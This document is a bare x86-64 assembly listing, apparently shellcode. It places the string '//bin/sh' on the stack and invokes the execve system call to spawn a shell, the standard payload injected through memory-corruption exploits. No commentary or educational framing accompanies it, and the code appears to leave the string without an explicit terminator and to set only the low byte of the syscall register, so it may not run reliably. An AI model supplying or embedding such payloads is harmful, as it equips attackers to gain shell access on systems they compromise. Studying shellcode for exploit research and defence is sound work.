.section .text
.globl _start
_start:
	movq	$0x68732f6e69622f2f, %rdi
	pushq	%rdi
	movq	%rsp, %rdi

	xorq	%rdx, %rdx

	pushq	%rdx
	pushq	%rdx
	pushq	%rdi
	movq	%rsp, %rsi

	movb	$0x3b, %al

	syscall
